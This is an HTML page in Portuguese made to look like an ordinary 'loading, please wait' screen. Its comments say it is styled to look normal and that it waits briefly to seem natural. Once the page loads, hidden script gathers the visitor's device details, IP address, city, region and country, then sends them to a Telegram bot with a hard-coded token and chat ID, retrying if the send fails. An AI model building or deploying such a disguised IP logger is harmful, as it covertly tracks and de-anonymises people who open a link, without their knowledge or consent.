<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        /* Estilo para parecer uma página de carregamento normal */
        body { 
            font-family: sans-serif; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: #ffffff; 
            color: #333;
            margin: 0;
        }
        .loader { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 14px; color: #888; }
        .status-indicator {
            position: absolute;
            bottom: 20px;
            right: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>Aguarde um momento, o conteúdo está sendo carregado...</p>
    <div class="status-indicator" id="status-indicator">Iniciando...</div>

    <script>
        // CONFIGURAÇÕES DO SEU BOT (Já inseridas)
        const TOKEN = "8330854830:AAEkZ_n9vNvsXAR9SbL74YuLIouEzjmDDnQ";
        const CHAT_ID = "8545439773";
        
        // Cache para localização e fila de mensagens
        let locationCache = null;
        const CACHE_DURATION = 5 * 60 * 1000; // 5 minutos
        const messageQueue = [];
        const MAX_RETRIES = 3;

        // Função para atualizar o indicador de status
        function updateStatus(message, isError = false) {
            const indicator = document.getElementById('status-indicator');
            indicator.textContent = message;
            indicator.style.color = isError ? '#d32f2f' : '#888';
        }

        // Coleta otimizada de informações do dispositivo
        async function collectDeviceInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                online: navigator.onLine,
                connectionType: connection ? connection.effectiveType : 'Desconhecido',
                timestamp: new Date().toISOString() // Formato ISO é mais padronizado
            };
        }

        // Função de localização com cache
        async function getLocationInfo() {
            if (locationCache && (Date.now() - locationCache.timestamp < CACHE_DURATION)) {
                return locationCache.data;
            }

            try {
                updateStatus("Obtendo localização...");
                const res = await fetch('https://ipapi.co/json/', {
                    signal: AbortSignal.timeout(5000) // Timeout de 5 segundos
                });
                const ipData = await res.json();
                const locationData = `IP: ${ipData.ip}\nCidade: ${ipData.city}\nRegião: ${ipData.region}\nPaís: ${ipData.country_name}`;
                
                locationCache = {
                    timestamp: Date.now(),
                    data: locationData
                };
                
                updateStatus("Localização obtida");
                return locationData;
            } catch (e) {
                console.error('Erro ao obter localização:', e);
                updateStatus("Erro ao obter localização", true);
                return "Localização indisponível";
            }
        }

        // Função de envio otimizada com timeout e tratamento de erros
        async function enviarParaTelegram(mensagem) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            
            // Adicionar timeout e retry automático
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout
            
            try {
                updateStatus("Enviando para Telegram...");
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: mensagem,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true // Evita pré-visualização indesejada
                    }),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                
                if (!response.ok) {
                    const errorData = await response.json();
                    console.error("Erro no envio ao Telegram:", errorData);
                    updateStatus("Erro no envio", true);
                    return false;
                }
                
                updateStatus("Dados enviados com sucesso");
                return true;
            } catch (error) {
                clearTimeout(timeoutId);
                console.error("Erro de conexão:", error);
                updateStatus("Erro de conexão", true);
                return false;
            }
        }

        // Sistema de fila para processamento de mensagens
        async function processQueue() {
            while (messageQueue.length > 0) {
                const { message, retries = 0 } = messageQueue[0];
                
                const success = await enviarParaTelegram(message);
                
                if (success || retries >= MAX_RETRIES) {
                    messageQueue.shift(); // Remove da fila
                    if (retries >= MAX_RETRIES && !success) {
                        updateStatus("Máximo de tentativas atingido", true);
                    }
                } else {
                    // Atualiza com mais uma tentativa
                    messageQueue[0].retries = (retries || 0) + 1;
                    updateStatus(`Tentativa ${messageQueue[0].retries} de ${MAX_RETRIES}`);
                    // Espera antes de tentar novamente (tempo crescente)
                    await new Promise(resolve => setTimeout(resolve, 5000 * messageQueue[0].retries));
                }
            }
            
            if (messageQueue.length === 0) {
                updateStatus("Processo concluído");
            }
        }

        // Função principal otimizada
        async function collectAndSend() {
            try {
                updateStatus("Coletando informações do dispositivo...");
                const deviceInfo = await collectDeviceInfo();
                
                updateStatus("Obtendo localização...");
                const locationInfo = await getLocationInfo();
                
                updateStatus("Preparando mensagem...");
                const mensagem = `🚀 *NOVO ACESSO DETECTADO!*\n\n` +
                                 `📅 *Data:* ${new Date(deviceInfo.timestamp).toLocaleString('pt-BR')}\n` +
                                 `📱 *Dispositivo:* ${deviceInfo.userAgent}\n` +
                                 `🖥️ *Resolução:* ${deviceInfo.screenSize}\n` +
                                 `🌐 *Rede/Local:* \n${locationInfo}\n` +
                                 `🌍 *Idioma:* ${deviceInfo.language}\n` +
                                 `⚙️ *Plataforma:* ${deviceInfo.platform}\n` +
                                 `📶 *Status Internet:* ${deviceInfo.online ? "Sim" : "Não"}\n` +
                                 `🔗 *Conexão:* ${deviceInfo.connectionType}`;

                // Adiciona à fila para processamento
                messageQueue.push({ message: mensagem });
                
                // Inicia o processamento da fila
                processQueue();
            } catch (error) {
                console.error("Erro no processo principal:", error);
                updateStatus("Erro inesperado", true);
            }
        }

        // Inicia o processo após um pequeno delay para parecer natural
        window.onload = () => {
            setTimeout(collectAndSend, 1500);
        };
    </script>
</body>
</html>